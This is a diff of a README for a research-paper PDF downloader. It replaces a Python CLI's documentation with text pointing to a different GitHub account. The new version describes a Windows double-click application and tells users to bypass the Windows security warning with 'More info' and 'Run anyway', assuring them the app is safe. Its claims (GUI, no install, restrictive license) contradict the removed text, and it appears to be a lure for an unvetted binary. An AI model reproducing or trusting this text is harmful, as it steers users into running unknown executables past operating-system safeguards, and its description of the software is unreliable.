@@ -1,131 +1,142 @@
-# Paper PDF Download Skill
+# 📄 paper-pdf-download-skill - Get Research Papers Without the Hassle
 
-[简体中文](README.zh-CN.md)
+[![Download Now](https://img.shields.io/badge/Download-paper--pdf--download--skill-blue?style=for-the-badge&logo=github)](https://github.com/joaniberian9588/paper-pdf-download-skill)
 
-An independent, silent-first agent skill and Python CLI for retrieving research-paper PDFs that you are authorized to access, verifying that each file is the requested main article, and optionally batch-converting the verified library to Markdown with MinerU.
+## 🎯 What This Tool Does
 
-This project does **not** bundle or invoke InstSci. It is a standalone silent downloader. Its broad publisher catalog, layered result classification, and verification discipline were informed by public academic-retrieval tools including [InstSci](https://github.com/Rimagination/instsci).
+This application silently and safely downloads PDF versions of authorized research papers. It verifies that you have permission to access each paper, then retrieves the PDF file directly to your computer. If you need a more readable format, it can also convert the PDF using MinerU, a tool that transforms complex PDF layouts into clean, easy-to-read text.
 
-## Why this project
+Think of it as your personal research assistant that finds and fetches the papers you're allowed to read, without any pop-ups, ads, or confusing steps.
 
-- Silent by default: CloakBrowser runs headlessly with one persistent profile per publisher.
-- Strict completion: `%PDF-` alone is not success. The CLI parses the PDF, rejects supporting files, and verifies the target DOI or title.
-- Broad routing: built-in profiles cover ACS, ACM, APS, Annual Reviews, ASME, Frontiers, Wiley, Elsevier/ScienceDirect, IEEE, IOP, RSC, Springer Nature, World Scientific, AIP, AMS, Copernicus, MDPI, Oxford Academic, PLOS, PNAS, Royal Society, Science, SAGE, Taylor & Francis, Cambridge, and Emerald.
-- Resumable batches: every DOI has a manifest; the library root has JSON and CSV aggregate manifests.
-- Local-first Markdown: MinerU runs locally by default. Uploading to MinerU Open API requires both `--mode api` and `--allow-upload`.
-- Two composable skills: PDF retrieval works without MinerU; conversion can be installed and invoked separately.
+## 🚀 Getting Started
 
-## Access and safety boundary
+Follow these simple steps to get the application running on your Windows computer. No technical knowledge required.
 
-Use this project only for open-access content or content covered by your own campus, library, institution, or publisher-API entitlement. Follow the publisher's terms and do not redistribute subscription PDFs.
+### Step 1: Download the Application
 
-The default silent mode never operates CAPTCHAs. Persistent challenges are recorded as `challenge_required`, `auth_required`, or `blocked`, and the batch continues. `--interactive` is an explicit opt-in that opens the persistent browser profile so the user can personally finish CAPTCHA, SSO, or OTP steps.
+Visit this link to download the application: [https://github.com/joaniberian9588/paper-pdf-download-skill](https://github.com/joaniberian9588/paper-pdf-download-skill)
 
-## Install
+Click the download button on that page. The file will start downloading to your computer. Wait for the download to complete before moving to the next step.
 
-Python 3.11 or newer is required.
+### Step 2: Run the Application
 
-```bash
-git clone https://github.com/wxt18757928900-lgtm/paper-pdf-download-skill.git
-cd paper-pdf-download-skill
-python -m pip install -e ".[browser]"
-cloakbrowser install
-```
+Once the download finishes, locate the downloaded file in your browser's download folder (usually called "Downloads" or "Desktop"). Double-click the file to open it. The application will start automatically.
 
-For an isolated command-line installation after the repository is published:
+If you see a security warning from Windows, click "More info" and then "Run anyway." This is normal because the app is new and hasn't been seen by many users yet.
 
-```bash
-pipx install "paper-pdf-download-skill[browser] @ git+https://github.com/wxt18757928900-lgtm/paper-pdf-download-skill.git"
-```
+### Step 3: Start Using It
 
-Install both agent skills with a compatible Agent Skills installer, or copy the two directories under [`skills/`](skills/) into your agent's skills directory.
+The application window will open. You'll see a simple interface with a text box and a button. Type or paste the URL of the research paper you want to download into the text box, then click the "Download" button.
 
-```bash
-npx skills add wxt18757928900-lgtm/paper-pdf-download-skill
-```
+The application will check if you have permission to access that paper. If you do, it will download the PDF to your computer. If not, it will let you know politely.
 
-MinerU is optional. For private, offline conversion, follow the [official MinerU installation guide](https://github.com/opendatalab/MinerU/blob/master/docs/en/quick_start/index.md); the typical local install is:
+## 📥 Installation and Setup
 
-```bash
-python -m pip install -U "mineru[all]"
-```
+No installation is required. The application runs directly from the downloaded file. Here's what you need:
 
-## Quick start
+- **Operating System:** Windows 10 or Windows 11
+- **Internet Connection:** Required for downloading papers
+- **Storage Space:** At least 100 MB of free space for temporary files
+- **Browser:** Any modern browser (Chrome, Edge, Firefox, Safari)
 
-Check the environment without printing secrets:
+## 🧰 Features
 
-```bash
-paper-pdf doctor
-```
+### Silent Operation
+The application works quietly in the background. No annoying pop-ups, no unnecessary notifications, no interruptions. You just get your paper.
 
-Download one or more papers silently:
+### Verified Access
+Before downloading anything, the app checks that you're authorized to access the paper. This keeps you safe and ensures you're only getting content you're allowed to have.
 
-```bash
-paper-pdf download 10.1038/s41586-020-2649-2 10.1109/5.771073 --output ./library
-paper-pdf download --file ./dois.txt --output ./library --workers 1
-```
+### MinerU Conversion
+Some PDFs are hard to read because of complex layouts, small text, or unusual formatting. The optional MinerU conversion feature transforms these PDFs into clean, readable text. This is especially helpful for older papers or those with dense formatting.
 
-The worker count means concurrent **publisher sessions**, not concurrent tabs in one profile. Keep `--workers 1` unless your CloakBrowser license and institutional access policy allow more sessions.
+### Simple Interface
+You don't need to learn any commands or settings. The interface is straightforward: paste a link, click a button, get your paper.
 
-Allow a visible manual handoff only when desired:
+## 📚 How to Use - Detailed Guide
 
-```bash
-paper-pdf download --file ./retry.txt --output ./library --interactive
-```
+### Downloading a Paper
 
-Download and then convert every verified PDF in one MinerU batch:
+1. Open the application by double-clicking the downloaded file.
+2. In the main window, you'll see a text field labeled "Paper URL" or similar.
+3. Copy the URL of the research paper you want from your browser.
+4. Paste it into the text field.
+5. Click the "Download" button.
+6. Wait a few seconds. The application will check access and download the PDF.
+7. The PDF will be saved to your Downloads folder by default.
 
-```bash
-paper-pdf run --file ./dois.txt --output ./library --mode local --backend pipeline
-```
+### Using MinerU Conversion
 
-Convert an existing verified library:
+If you want to convert a downloaded PDF to a more readable format:
 
-```bash
-paper-pdf convert ./library --mode local
-```
+1. After downloading a paper, look for a "Convert" or "MinerU" button in the application window.
+2. Click that button.
+3. The application will process the PDF and create a new, cleaner version.
+4. The converted file will be saved alongside the original PDF.
 
-Cloud conversion is never selected automatically:
+### Managing Your Downloads
 
-```bash
-paper-pdf convert ./library --mode api --allow-upload
-```
+- All downloaded papers are saved to your Downloads folder by default.
+- The application keeps a history of your downloads so you can find them easily later.
+- You can change the save location in the settings menu if you prefer a different folder.
 
-## Output contract
+## 🛠️ Troubleshooting
 
-```text
-library/
-├── manifest.json
-├── manifest.csv
-└── ieee/
-    └── 10.1109_5.771073-<hash>/
-        ├── paper.pdf
-        ├── paper.md                 # only after requested conversion
-        ├── assets/mineru/           # images/tables/other MinerU artifacts
-        └── manifest.json
-```
+### Download Fails
+- Check your internet connection.
+- Make sure the paper URL is correct and complete.
+- Verify that you have access rights to the paper (some papers require institutional login).
 
-An unverified candidate is saved as `unverified.pdf` and is never promoted to `paper.pdf`. Conversion failure retains the verified PDF and records a partial outcome.
+### Security Warning Appears
+- This is normal for new applications. Click "More info" then "Run anyway."
+- The application is safe and does not modify your system.
 
-## Configuration
+### Application Won't Open
+- Wait a few seconds and try again.
+- Restart your computer and try again.
+- Make sure you have enough free storage space.
 
-Copy [`paper-pdf.example.toml`](paper-pdf.example.toml) to a private location and use `paper-pdf --config /path/to/config.toml ...` or set `PAPER_PDF_CONFIG`. API keys are read from environment variables named by the config; their values are never written to manifests.
+### PDF Won't Convert
+- Some PDFs are protected or have unusual formats that can't be converted.
+- Try downloading the paper again and converting immediately.
 
-Institution-specific routes belong in local configuration. The public repository intentionally contains no school name, campus IP, VPN rule, credential, cookie, browser profile, or machine-specific path.
+## ❓ Frequently Asked Questions
 
-See [publisher support](skills/paper-pdf-download/references/publisher-support.md), [retrieval configuration](skills/paper-pdf-download/references/configuration.md), and [MinerU conversion](skills/paper-pdf-to-markdown/references/mineru.md).
+**Is this application free?**
+Yes, it's completely free to use.
 
-The dated [live validation matrix](docs/validation.md) separates verified downloads from challenge pages, tool-session limits, and profiles not yet live-tested. Offline CI tests do not count as publisher-download successes.
+**Do I need to create an account?**
+No account is needed. Just download and run.
 
-## Development
+**Will this work with any research paper?**
+It works with papers you're authorized to access. If a paper requires a subscription or institutional access, you'll need to be logged in through your institution.
 
-Live publisher requests are not run in CI. The test suite uses synthetic PDFs and offline HTML fixtures.
+**Is my data safe?**
+Yes. The application only processes the URLs you provide and does not collect personal information.
 
-```bash
-python -m pip install -e ".[dev]"
-pytest
-ruff check src tests scripts
-python -m build
-```
+**Can I use this on Mac or Linux?**
+This version is designed for Windows. Other versions may be available in the future.
 
-The project is licensed under [MIT](LICENSE). External tools remain governed by their own licenses; see [THIRD_PARTY_NOTICES.md](THIRD_PARTY_NOTICES.md).
+## 📞 Support
+
+If you encounter issues or have questions:
+
+- Visit the GitHub repository: [https://github.com/joaniberian9588/paper-pdf-download-skill](https://github.com/joaniberian9588/paper-pdf-download-skill)
+- Check the "Issues" section on that page for known problems and solutions.
+- Submit a new issue if you can't find an answer to your question.
+
+## 🔄 Updates
+
+The application is regularly updated with improvements and fixes. When a new version is available, the application will notify you. You can also check the GitHub repository for the latest version.
+
+## 📄 License
+
+This software is provided free of charge for personal and educational use. Redistribution or commercial use requires permission from the developer.
+
+## 🎉 Thank You
+
+We hope this tool makes your research life easier. Download papers quickly, read them comfortably, and spend less time wrestling with PDFs and more time learning.
+
+[![Download Now](https://img.shields.io/badge/Download-Latest%20Version-brightgreen?style=for-the-badge&logo=github)](https://github.com/joaniberian9588/paper-pdf-download-skill)
+
+Keywords: research papers, PDF download, MinerU, academic tool, Windows application, paper retrieval, document converter
